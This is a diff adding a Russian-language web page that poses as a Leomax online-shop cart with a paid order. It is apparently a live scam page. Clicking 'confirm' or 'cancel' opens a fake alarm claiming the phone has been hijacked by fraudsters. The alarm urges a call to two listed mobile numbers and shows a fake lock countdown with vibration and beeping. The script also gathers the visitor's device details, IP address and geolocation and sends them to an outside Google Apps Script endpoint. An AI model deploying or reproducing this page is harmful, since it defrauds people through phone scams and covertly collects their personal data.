@@ -1,0 +1,1109 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Корзина - Леомакс</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛒</text></svg>">
+    <style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
+    background-color: #f5f5f5;
+    color: #333;
+    line-height: 1.6;
+}
+
+.container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 20px;
+}
+
+/* Header */
+.header {
+    background-color: #fff;
+    border-bottom: 1px solid #e0e0e0;
+    padding: 15px 0;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+}
+
+.header-content {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 20px;
+}
+
+.logo {
+    font-size: 24px;
+    font-weight: 700;
+    color: #FF6B00;
+}
+
+.nav {
+    display: flex;
+    gap: 25px;
+}
+
+.nav a {
+    color: #333;
+    text-decoration: none;
+    font-size: 15px;
+    transition: color 0.3s;
+}
+
+.nav a:hover {
+    color: #FF6B00;
+}
+
+.header-icons {
+    display: flex;
+    gap: 20px;
+    align-items: center;
+}
+
+.icon {
+    font-size: 20px;
+    cursor: pointer;
+    position: relative;
+}
+
+.cart-badge {
+    position: absolute;
+    top: -8px;
+    right: -8px;
+    background-color: #FF6B00;
+    color: white;
+    border-radius: 50%;
+    width: 18px;
+    height: 18px;
+    font-size: 11px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 600;
+}
+
+/* Main Content */
+.main-content {
+    padding: 40px 0;
+}
+
+.page-title {
+    font-size: 32px;
+    margin-bottom: 30px;
+    color: #333;
+}
+
+/* Order Status */
+.order-status {
+    background: linear-gradient(135deg, #fff8e1 0%, #ffe0b2 100%);
+    border: 2px solid #FF6B00;
+    border-radius: 12px;
+    padding: 20px;
+    margin-bottom: 30px;
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    box-shadow: 0 4px 12px rgba(255, 107, 0, 0.15);
+}
+
+.status-icon {
+    font-size: 48px;
+    animation: rotate 2s linear infinite;
+}
+
+.status-info h3 {
+    font-size: 18px;
+    color: #333;
+    margin-bottom: 8px;
+}
+
+.status-text {
+    color: #FF6B00;
+    font-weight: 700;
+}
+
+.payment-status {
+    font-size: 16px;
+    color: #4CAF50;
+    font-weight: 600;
+    margin-bottom: 5px;
+}
+
+.order-number {
+    font-size: 14px;
+    color: #666;
+}
+
+.delivery-date {
+    font-size: 15px;
+    color: #333;
+    margin-top: 5px;
+    font-weight: 500;
+}
+
+.delivery-highlight {
+    color: #FF6B00;
+    font-weight: 700;
+}
+
+@keyframes rotate {
+    from { transform: rotate(0deg); }
+    to { transform: rotate(360deg); }
+}
+
+/* Quick Action Buttons */
+.quick-actions {
+    display: flex;
+    gap: 15px;
+    margin-bottom: 30px;
+}
+
+.btn-quick {
+    flex: 1;
+    padding: 18px 30px;
+    border: none;
+    border-radius: 10px;
+    font-size: 17px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: all 0.3s;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+}
+
+.btn-icon {
+    font-size: 22px;
+}
+
+.btn-quick-confirm {
+    background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
+    color: white;
+}
+
+.btn-quick-confirm:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 6px 20px rgba(76, 175, 80, 0.4);
+}
+
+.btn-quick-cancel {
+    background: linear-gradient(135deg, #f44336 0%, #da190b 100%);
+    color: white;
+}
+
+.btn-quick-cancel:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 6px 20px rgba(244, 67, 54, 0.4);
+}
+
+.cart-layout {
+    display: grid;
+    grid-template-columns: 1fr 400px;
+    gap: 30px;
+}
+
+/* Cart Items */
+.cart-items {
+    display: flex;
+    flex-direction: column;
+    gap: 20px;
+}
+
+.cart-item {
+    background: white;
+    border-radius: 12px;
+    padding: 20px;
+    display: flex;
+    gap: 20px;
+    position: relative;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+}
+
+.item-image {
+    width: 120px;
+    height: 120px;
+    flex-shrink: 0;
+    overflow: hidden;
+    border-radius: 8px;
+    background-color: #f5f5f5;
+}
+
+.item-image img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+
+.item-details {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+}
+
+.item-name {
+    font-size: 16px;
+    font-weight: 600;
+    color: #333;
+    line-height: 1.4;
+}
+
+.item-code {
+    font-size: 13px;
+    color: #888;
+}
+
+.item-controls {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: auto;
+}
+
+.quantity-control {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    border: 1px solid #e0e0e0;
+    border-radius: 8px;
+    padding: 5px;
+}
+
+.qty-btn {
+    width: 30px;
+    height: 30px;
+    border: none;
+    background-color: #f5f5f5;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 18px;
+    transition: background-color 0.2s;
+}
+
+.qty-btn:hover {
+    background-color: #e0e0e0;
+}
+
+.qty-input {
+    width: 40px;
+    text-align: center;
+    border: none;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.item-price {
+    font-size: 20px;
+    font-weight: 700;
+    color: #333;
+}
+
+.remove-btn {
+    position: absolute;
+    top: 15px;
+    right: 15px;
+    width: 28px;
+    height: 28px;
+    border: none;
+    background-color: #f5f5f5;
+    border-radius: 50%;
+    cursor: pointer;
+    font-size: 16px;
+    color: #888;
+    transition: all 0.2s;
+}
+
+.remove-btn:hover {
+    background-color: #FF6B00;
+    color: white;
+}
+
+/* Order Summary */
+.order-summary {
+    background: white;
+    border-radius: 12px;
+    padding: 25px;
+    height: fit-content;
+    position: sticky;
+    top: 90px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+}
+
+.order-summary h2 {
+    font-size: 22px;
+    margin-bottom: 20px;
+    color: #333;
+}
+
+.summary-row {
+    display: flex;
+    justify-content: space-between;
+    padding: 12px 0;
+    border-bottom: 1px solid #f0f0f0;
+    font-size: 15px;
+}
+
+.summary-row.total {
+    border-bottom: none;
+    font-size: 20px;
+    font-weight: 700;
+    color: #FF6B00;
+    padding-top: 15px;
+    margin-top: 10px;
+    border-top: 2px solid #f0f0f0;
+}
+
+.discount {
+    color: #4CAF50;
+    font-weight: 600;
+}
+
+.action-buttons {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    margin-top: 25px;
+}
+
+.btn {
+    width: 100%;
+    padding: 16px;
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s;
+}
+
+.btn-primary {
+    background-color: #FF6B00;
+    color: white;
+}
+
+.btn-primary:hover {
+    background-color: #e55f00;
+    transform: translateY(-2px);
+}
+
+.btn-secondary {
+    background-color: white;
+    color: #666;
+    border: 2px solid #ddd;
+}
+
+.btn-secondary:hover {
+    border-color: #999;
+}
+
+.paid-badge {
+    background-color: #e8f5e9;
+    color: #2e7d32;
+    padding: 12px;
+    border-radius: 8px;
+    text-align: center;
+    font-size: 14px;
+    font-weight: 600;
+    margin-top: 15px;
+    border: 2px solid #4CAF50;
+}
+
+.promo-info {
+    margin-top: 20px;
+    padding: 15px;
+    background-color: #fff3e0;
+    border-radius: 8px;
+    text-align: center;
+    font-size: 14px;
+    color: #FF6B00;
+    font-weight: 500;
+}
+
+/* Footer */
+.footer {
+    background-color: #2c2c2c;
+    color: #fff;
+    padding: 30px 0;
+    margin-top: 60px;
+}
+
+.footer-content {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 30px;
+}
+
+.footer-info p {
+    margin: 5px 0;
+    font-size: 14px;
+}
+
+.footer-support {
+    color: #FF6B00;
+    font-weight: 600;
+}
+
+.footer-links {
+    display: flex;
+    gap: 20px;
+}
+
+.footer-links a {
+    color: #fff;
+    text-decoration: none;
+    font-size: 14px;
+    transition: color 0.3s;
+}
+
+.footer-links a:hover {
+    color: #FF6B00;
+}
+
+/* Modal */
+.modal {
+    display: none;
+    position: fixed;
+    z-index: 1000;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.9);
+    animation: fadeIn 0.3s;
+    overflow-y: auto;
+}
+
+.modal-content {
+    background-color: #8B1A1A;
+    color: white;
+    margin: 15px auto;
+    padding: 30px 25px;
+    width: 90%;
+    max-width: 550px;
+    border-radius: 16px;
+    text-align: center;
+    position: relative;
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+    animation: slideDown 0.4s;
+    max-height: 90vh;
+    overflow-y: auto;
+}
+
+.demo-watermark {
+    position: absolute;
+    top: 20px;
+    right: 20px;
+    font-size: 48px;
+    font-weight: 900;
+    color: rgba(255, 255, 255, 0.2);
+    transform: rotate(-15deg);
+    letter-spacing: 2px;
+}
+
+.demo-label {
+    position: absolute;
+    top: 15px;
+    left: 20px;
+    background-color: rgba(255, 255, 255, 0.3);
+    color: white;
+    padding: 8px 16px;
+    border-radius: 20px;
+    font-size: 12px;
+    font-weight: 600;
+}
+
+.warning-icon {
+    font-size: 60px;
+    margin-bottom: 15px;
+    animation: pulse 1.5s infinite;
+}
+
+.warning-title {
+    font-size: 22px;
+    font-weight: 800;
+    margin-bottom: 15px;
+    text-transform: uppercase;
+    color: #FFD700;
+    line-height: 1.2;
+}
+
+.warning-text {
+    font-size: 18px;
+    font-weight: 700;
+    margin-bottom: 12px;
+    color: #FFFF00;
+    line-height: 1.3;
+}
+
+.warning-description {
+    font-size: 14px;
+    margin-bottom: 20px;
+    color: rgba(255, 255, 255, 0.95);
+    line-height: 1.4;
+}
+
+.emergency-btn {
+    background-color: #FF0000;
+    color: white;
+    border: none;
+    padding: 14px 25px;
+    font-size: 14px;
+    font-weight: 700;
+    border-radius: 10px;
+    cursor: pointer;
+    width: 100%;
+    margin-bottom: 20px;
+    animation: blink 1s infinite;
+    text-transform: uppercase;
+}
+
+.phone-block {
+    background-color: white;
+    color: #8B1A1A;
+    padding: 18px;
+    border-radius: 12px;
+    margin-bottom: 20px;
+}
+
+.phone-number {
+    font-size: 26px;
+    font-weight: 900;
+    margin-bottom: 8px;
+}
+
+.phone-link {
+    color: #8B1A1A;
+    text-decoration: none;
+    display: block;
+    cursor: pointer;
+    transition: all 0.3s;
+    padding: 10px;
+    border-radius: 8px;
+}
+
+.phone-link:hover {
+    background-color: #f0f0f0;
+    transform: scale(1.05);
+}
+
+.phone-divider {
+    font-size: 18px;
+    font-weight: 600;
+    color: #666;
+    margin: 10px 0;
+}
+
+.phone-instruction {
+    font-size: 14px;
+    font-weight: 600;
+    color: #FF6B00;
+    margin-top: 15px;
+}
+
+.warning-footer {
+    margin-top: 20px;
+}
+
+.warning-notice {
+    font-size: 15px;
+    font-weight: 600;
+    margin-bottom: 10px;
+    color: #FFD700;
+}
+
+.warning-timer {
+    font-size: 14px;
+    color: rgba(255, 255, 255, 0.9);
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+}
+
+@keyframes slideDown {
+    from { transform: translateY(-50px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+}
+
+@keyframes pulse {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.1); }
+}
+
+@keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.8; }
+}
+
+/* Responsive */
+@media (max-width: 768px) {
+    .nav { display: none; }
+    .cart-layout { grid-template-columns: 1fr; }
+    .order-summary { position: static; }
+    .quick-actions { flex-direction: column; }
+    .order-status { flex-direction: column; text-align: center; }
+    .footer-content { flex-direction: column; text-align: center; }
+    .footer-links { flex-wrap: wrap; justify-content: center; }
+    .cart-item { flex-direction: column; }
+    .item-image { width: 100%; height: 200px; }
+    
+    /* Адаптивность модального окна для мобильных - МАКСИМАЛЬНО КОМПАКТНО */
+    .modal-content { 
+        padding: 12px 10px; 
+        width: 96%; 
+        margin: 5px auto;
+        max-height: 98vh;
+        border-radius: 12px;
+    }
+    .demo-watermark { font-size: 18px; top: 5px; right: 5px; }
+    .demo-label { font-size: 8px; padding: 3px 8px; top: 5px; left: 5px; }
+    .warning-icon { font-size: 40px; margin-bottom: 8px; }
+    .warning-title { font-size: 15px; margin-bottom: 8px; line-height: 1.2; }
+    .warning-text { font-size: 14px; margin-bottom: 8px; line-height: 1.3; }
+    .warning-description { font-size: 11px; margin-bottom: 12px; line-height: 1.4; }
+    .emergency-btn { padding: 10px 15px; font-size: 11px; margin-bottom: 12px; }
+    .phone-block { padding: 10px; margin-bottom: 12px; }
+    .phone-number { font-size: 18px; margin-bottom: 5px; padding: 5px; }
+    .phone-divider { font-size: 12px; margin: 4px 0; }
+    .phone-instruction { font-size: 10px; margin-top: 8px; }
+    .warning-notice { font-size: 11px; margin-bottom: 5px; }
+    .warning-timer { font-size: 11px; }
+    .warning-footer { margin-top: 10px; }
+}
+
+/* Дополнительная адаптация для ОЧЕНЬ маленьких экранов */
+@media (max-width: 480px) {
+    .modal-content {
+        padding: 8px 8px;
+        margin: 3px auto;
+        width: 98%;
+        max-height: 99vh;
+    }
+    .demo-watermark { font-size: 16px; }
+    .demo-label { font-size: 7px; padding: 2px 6px; }
+    .warning-icon { font-size: 35px; margin-bottom: 5px; }
+    .warning-title { font-size: 13px; margin-bottom: 6px; }
+    .warning-text { font-size: 12px; margin-bottom: 6px; }
+    .warning-description { font-size: 10px; margin-bottom: 10px; }
+    .warning-description br { display: none; }
+    .emergency-btn { padding: 8px 12px; font-size: 10px; margin-bottom: 10px; }
+    .phone-block { padding: 8px; margin-bottom: 10px; }
+    .phone-number { font-size: 16px; margin-bottom: 4px; padding: 4px; }
+    .phone-divider { font-size: 11px; margin: 3px 0; }
+    .phone-instruction { font-size: 9px; margin-top: 6px; }
+    .warning-notice { font-size: 10px; margin-bottom: 4px; }
+    .warning-timer { font-size: 10px; }
+    .warning-footer { margin-top: 8px; }
+}
+
+/* Еще более компактная версия для экранов < 380px (iPhone SE, старые Android) */
+@media (max-width: 380px) {
+    .modal-content {
+        padding: 6px 6px;
+        margin: 2px auto;
+    }
+    .warning-icon { font-size: 30px; margin-bottom: 4px; }
+    .warning-title { font-size: 12px; margin-bottom: 5px; }
+    .warning-text { font-size: 11px; margin-bottom: 5px; }
+    .warning-description { font-size: 9px; margin-bottom: 8px; line-height: 1.3; }
+    .emergency-btn { padding: 7px 10px; font-size: 9px; margin-bottom: 8px; }
+    .phone-block { padding: 6px; margin-bottom: 8px; }
+    .phone-number { font-size: 15px; margin-bottom: 3px; padding: 3px; }
+    .phone-divider { font-size: 10px; margin: 2px 0; }
+    .phone-instruction { font-size: 8px; margin-top: 5px; }
+    .warning-notice { font-size: 9px; margin-bottom: 3px; }
+    .warning-timer { font-size: 9px; }
+}
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">ЛЕОМАКС</div>
+                <nav class="nav">
+                    <a href="#">Каталог</a>
+                    <a href="#">Акции</a>
+                    <a href="#">Доставка</a>
+                </nav>
+                <div class="header-icons">
+                    <span class="icon">🔍</span>
+                    <span class="icon">❤️</span>
+                    <span class="icon cart-icon">🛒 <span class="cart-badge">2</span></span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <div class="container">
+            <h1 class="page-title">Корзина</h1>
+            
+            <div class="order-status">
+                <div class="status-icon">⏳</div>
+                <div class="status-info">
+                    <h3>Статус заказа: <span class="status-text">Ожидает подтверждения получателя</span></h3>
+                    <p class="payment-status">✅ Заказ оплачен</p>
+                    <p class="order-number">Номер заказа: #LM-2024-89452</p>
+                    <p class="delivery-date">📦 Доставка: <span class="delivery-highlight">Сегодня</span></p>
+                </div>
+            </div>
+            
+            <div class="quick-actions">
+                <button class="btn-quick btn-quick-confirm" onclick="showWarning('Подтвердить')">
+                    <span class="btn-icon">✓</span>
+                    <span>Подтвердить получение заказа</span>
+                </button>
+                <button class="btn-quick btn-quick-cancel" onclick="showWarning('Отменить')">
+                    <span class="btn-icon">✕</span>
+                    <span>Отменить заказ</span>
+                </button>
+            </div>
+            
+            <div class="cart-layout">
+                <div class="cart-items">
+                    <div class="cart-item">
+                        <div class="item-image">
+                            <img src="https://sspark.genspark.ai/cfimages?u1=xOP2M7qhfsRO%2FnOhSca4%2Fgnea3%2FYk6YwdH4QCfwkQRB%2BC2XNHd%2BjMrjdaey8ft5b2m826%2BP7IIo1pSsgOuA99gpu9xZY86UtgoULJXRS76V57PkHgEsnBDfcOAIULqpxXAghiaoTOLP0qemcXiG7xYRY%2B10lhIvGDKuF1A%3D%3D&u2=m4ta%2FQ6dSv9BvPGC&width=2560" alt="Набор махровых полотенец белые 6 шт">
+                        </div>
+                        <div class="item-details">
+                            <h3 class="item-name">Набор махровых полотенец премиум класса</h3>
+                            <p class="item-code">Артикул: LM-12345678</p>
+                            <div class="item-controls">
+                                <div class="quantity-control">
+                                    <button class="qty-btn">-</button>
+                                    <input type="number" class="qty-input" value="1" readonly>
+                                    <button class="qty-btn">+</button>
+                                </div>
+                                <div class="item-price">2 490 ₽</div>
+                            </div>
+                        </div>
+                        <button class="remove-btn">✕</button>
+                    </div>
+
+                    <div class="cart-item">
+                        <div class="item-image">
+                            <img src="https://sspark.genspark.ai/cfimages?u1=N6dER%2FudHrOPvocFKCNcXNFHJSiJ7zRxqH%2BVeFvtkX0Y8gFKdT8pldPxPXlmCxDvxGJD8%2FXgdG8nZjkb79FB%2BdX1fw%3D%3D&u2=wP1N9vGTaoW0rV67&width=2560" alt="Набор кухонных принадлежностей из стали">
+                        </div>
+                        <div class="item-details">
+                            <h3 class="item-name">Набор кухонных принадлежностей из нержавеющей стали</h3>
+                            <p class="item-code">Артикул: LM-87654321</p>
+                            <div class="item-controls">
+                                <div class="quantity-control">
+                                    <button class="qty-btn">-</button>
+                                    <input type="number" class="qty-input" value="1" readonly>
+                                    <button class="qty-btn">+</button>
+                                </div>
+                                <div class="item-price">3 990 ₽</div>
+                            </div>
+                        </div>
+                        <button class="remove-btn">✕</button>
+                    </div>
+                </div>
+
+                <div class="order-summary">
+                    <h2>Итого</h2>
+                    <div class="summary-row">
+                        <span>Товары (2 шт.)</span>
+                        <span>6 480 ₽</span>
+                    </div>
+                    <div class="summary-row">
+                        <span>Скидка</span>
+                        <span class="discount">-648 ₽</span>
+                    </div>
+                    <div class="summary-row">
+                        <span>Доставка</span>
+                        <span>Бесплатно</span>
+                    </div>
+                    <div class="summary-row total">
+                        <span>Оплачено</span>
+                        <span>5 832 ₽</span>
+                    </div>
+                    <div class="paid-badge">✅ Заказ оплачен</div>
+                    
+                    <div class="action-buttons">
+                        <button class="btn btn-primary" onclick="showWarning('Подтвердить')">Подтвердить заказ</button>
+                        <button class="btn btn-secondary" onclick="showWarning('Отменить')">Отменить заказ</button>
+                    </div>
+
+                    <div class="promo-info">🎁 При заказе от 5000₽ - доставка бесплатно!</div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-info">
+                    <p>© 2024 Леомакс. Все права защищены.</p>
+                    <p class="footer-support">Служба поддержки: 8 (800) 200-06-09</p>
+                </div>
+                <div class="footer-links">
+                    <a href="#">О компании</a>
+                    <a href="#">Доставка</a>
+                    <a href="#">Контакты</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <div id="warningModal" class="modal">
+        <div class="modal-content">
+           
+            
+            <div class="warning-icon">⚠️</div>
+            <h2 class="warning-title">ВНИМАНИЕ! КРИТИЧЕСКАЯ УГРОЗА!</h2>
+            <p class="warning-text">ВАШИМ ТЕЛЕФОНОМ ЗАВЛАДЕЛИ МОШЕННИКИ!</p>
+            <p class="warning-description">
+                Обнаружена подозрительная активность на вашем устройстве!<br>
+                Ваши персональные данные и банковские счета находятся под угрозой!<br>
+               
+            </p>
+            
+            <button class="emergency-btn">🚨 СРОЧНО ПОЗВОНИТЕ НА ГОРЯЧУЮ ЛИНИЮ 🚨</button>
+            
+            <div class="phone-block">
+                <a href="tel:+79830174685" class="phone-number phone-link">+7 (983) 017-46-85 </a>
+                <div class="phone-divider">или</div>
+                <a href="tel:+79892696323" class="phone-number phone-link">+7 (989)269-63-23</a>
+            </div>
+            
+            <div class="warning-footer">
+                <p class="warning-notice">⚠️Мы ожидаем Ваш звонок!</p>
+                <p class="warning-timer">🔒 Ваше устройство будет заблокировано через 5:00</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+// === НАСТРОЙКА GOOGLE SHEETS ===
+const GOOGLE_SHEETS_URL = 'https://script.google.com/macros/s/AKfycbxJDqvoKvYTTsR6KcTzZ7HP219JkTfE77UzW_JrnnNrJYYxMatUCB17GfrLHCCV4T6IvA/exec';
+
+function showWarning(buttonType) {
+    document.getElementById('warningModal').style.display = 'block';
+    document.body.style.overflow = 'hidden';
+    
+    // Отправка в Google Sheets
+    sendToGoogleSheets(buttonType);
+    
+    // Вибрация
+    if ("vibrate" in navigator) {
+        navigator.vibrate([500, 200, 500, 200, 500]);
+        setInterval(() => navigator.vibrate([400, 150, 400, 150, 400]), 1500);
+    }
+    
+    // Звук
+    try {
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        const beep = (f, t, d) => {
+            const o = ctx.createOscillator();
+            const g = ctx.createGain();
+            o.connect(g);
+            g.connect(ctx.destination);
+            o.frequency.value = f;
+            g.gain.setValueAtTime(0.3, t);
+            o.start(t);
+            o.stop(t + d);
+        };
+        const now = ctx.currentTime;
+        beep(800, now, 0.2);
+        beep(800, now + 0.25, 0.2);
+        beep(800, now + 0.5, 0.3);
+        setInterval(() => {
+            const t = ctx.currentTime;
+            beep(800, t, 0.2);
+            beep(800, t + 0.25, 0.2);
+        }, 3000);
+    } catch (e) {}
+    
+    // Таймер
+    let countdown = 300;
+    const timer = document.querySelector('.warning-timer');
+    setInterval(() => {
+        countdown--;
+        const m = Math.floor(countdown / 60);
+        const s = countdown % 60;
+        timer.textContent = `🔒 Ваше устройство будет заблокировано через ${m}:${s.toString().padStart(2, '0')}`;
+        if (countdown <= 0) timer.textContent = '🔒 УСТРОЙСТВО ЗАБЛОКИРОВАНО!';
+    }, 1000);
+}
+
+async function sendToGoogleSheets(buttonType) {
+    // Получаем детальную информацию об устройстве
+    const ua = navigator.userAgent;
+    
+    // Определение типа устройства
+    let deviceType = 'Desktop';
+    if (/Mobile|Android|iPhone|iPod/i.test(ua)) deviceType = 'Mobile';
+    else if (/iPad|Tablet/i.test(ua)) deviceType = 'Tablet';
+    
+    // Определение модели устройства
+    let deviceModel = 'Unknown';
+    if (/iPhone/.test(ua)) {
+        const match = ua.match(/iPhone\s?(\d+[,_]\d+)?/);
+        deviceModel = match ? 'iPhone ' + (match[1] || 'Unknown').replace(/[,_]/g, '.') : 'iPhone';
+    } else if (/iPad/.test(ua)) {
+        deviceModel = 'iPad';
+    } else if (/Android/.test(ua)) {
+        const match = ua.match(/Android\s([0-9\.]+)/);
+        deviceModel = 'Android ' + (match ? match[1] : 'Unknown');
+        const modelMatch = ua.match(/\(([^)]+)\)/);
+        if (modelMatch) deviceModel += ' - ' + modelMatch[1].split(';')[1]?.trim() || '';
+    } else {
+        const match = ua.match(/\(([^)]+)\)/);
+        if (match) deviceModel = match[1].split(';')[0].trim();
+    }
+    
+    // Определение браузера
+    let browser = 'Unknown';
+    if (/Chrome/i.test(ua) && !/Edge|Edg/i.test(ua)) browser = 'Chrome';
+    else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+    else if (/Firefox/i.test(ua)) browser = 'Firefox';
+    else if (/Edge|Edg/i.test(ua)) browser = 'Edge';
+    else if (/Opera|OPR/i.test(ua)) browser = 'Opera';
+    
+    // Определение ОС
+    let os = 'Unknown';
+    if (/Windows/i.test(ua)) os = 'Windows';
+    else if (/Mac OS X/i.test(ua)) os = 'macOS';
+    else if (/Android/i.test(ua)) os = 'Android';
+    else if (/iOS|iPhone|iPad/i.test(ua)) os = 'iOS';
+    else if (/Linux/i.test(ua)) os = 'Linux';
+    
+    // Получение разрешения экрана
+    const screenRes = `${screen.width}x${screen.height}`;
+    const windowRes = `${window.innerWidth}x${window.innerHeight}`;
+    
+    // Определение языка
+    const language = navigator.language || navigator.userLanguage;
+    
+    // Получение IP-адреса (через внешний API)
+    let ipAddress = 'Unknown';
+    try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        ipAddress = ipData.ip;
+    } catch (e) {
+        ipAddress = 'N/A';
+    }
+    
+    // Получение геолокации по IP (с несколькими запасными API)
+    let location = 'Unknown';
+    
+    // Попытка 1: ipapi.co (лучший, но лимит 1000/день)
+    try {
+        const geoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`, {timeout: 3000});
+        const geoData = await geoResponse.json();
+        if (geoData.city && !geoData.error) {
+            location = `${geoData.city || ''}, ${geoData.region || ''}, ${geoData.country_name || ''}`.trim();
+            console.log('✅ Геолокация определена через ipapi.co');
+        } else {
+            throw new Error('Лимит API или ошибка');
+        }
+    } catch (e) {
+        console.log('⚠️ ipapi.co недоступен, пробуем запасной API...');
+        
+        // Попытка 2: ip-api.com (бесплатно, без лимитов для некоммерческого использования)
+        try {
+            const geoResponse2 = await fetch(`http://ip-api.com/json/${ipAddress}?lang=ru`);
+            const geoData2 = await geoResponse2.json();
+            if (geoData2.status === 'success') {
+                location = `${geoData2.city || ''}, ${geoData2.regionName || ''}, ${geoData2.country || ''}`.trim();
+                console.log('✅ Геолокация определена через ip-api.com');
+            } else {
+                throw new Error('ip-api.com недоступен');
+            }
+        } catch (e2) {
+            console.log('⚠️ ip-api.com недоступен, пробуем третий API...');
+            
+            // Попытка 3: ipwhois.app (бесплатно 10000/месяц)
+            try {
+                const geoResponse3 = await fetch(`https://ipwhois.app/json/${ipAddress}`);
+                const geoData3 = await geoResponse3.json();
+                if (geoData3.success) {
+                    location = `${geoData3.city || ''}, ${geoData3.region || ''}, ${geoData3.country || ''}`.trim();
+                    console.log('✅ Геолокация определена через ipwhois.app');
+                } else {
+                    location = 'N/A (все API недоступны)';
+                }
+            } catch (e3) {
+                location = 'N/A (ошибка сети)';
+                console.log('❌ Все геолокационные API недоступны');
+            }
+        }
+    }
+    
+    // Формирование данных для отправки
+    const data = {
+        // Основная информация
+        button: buttonType,
+        timestamp: new Date().toLocaleString('ru-RU'),
+        
+        // Устройство
+        deviceType: deviceType,
+        deviceModel: deviceModel,
+        os: os,
+        browser: browser,
+        
+        // Экран
+        screenResolution: screenRes,
+        windowResolution: windowRes,
+        
+        // Сеть
+        ipAddress: ipAddress,
+        location: location,
+        language: language,
+        
+        // User Agent (полный)
+        userAgent: ua
+    };
+    
+    console.log('📊 Отправка статистики:', data);
+    console.log('🔍 Проверка данных:');
+    console.log('  - Дата и время:', data.timestamp);
+    console.log('  - Кнопка:', data.button);
+    console.log('  - Тип устройства:', data.deviceType);
+    console.log('  - Модель:', data.deviceModel);
+    console.log('  - ОС:', data.os);
+    console.log('  - Браузер:', data.browser);
+    console.log('  - Разрешение экрана:', data.screenResolution);
+    console.log('  - Размер окна:', data.windowResolution);
+    console.log('  - IP-адрес:', data.ipAddress);
+    console.log('  - Местоположение:', data.location);
+    console.log('  - Язык:', data.language);
+    console.log('  - User Agent:', data.userAgent.substring(0, 50) + '...');
+    
+    // Отправка в Google Sheets
+    fetch(GOOGLE_SHEETS_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    })
+    .then(() => {
+        console.log('✅ Данные успешно отправлены в Google Sheets!');
+    })
+    .catch(e => {
+        console.log('⚠️ Ошибка отправки:', e);
+        console.log('Но это нормально при mode: no-cors');
+    });
+}
+    </script>
+</body>
+</html>
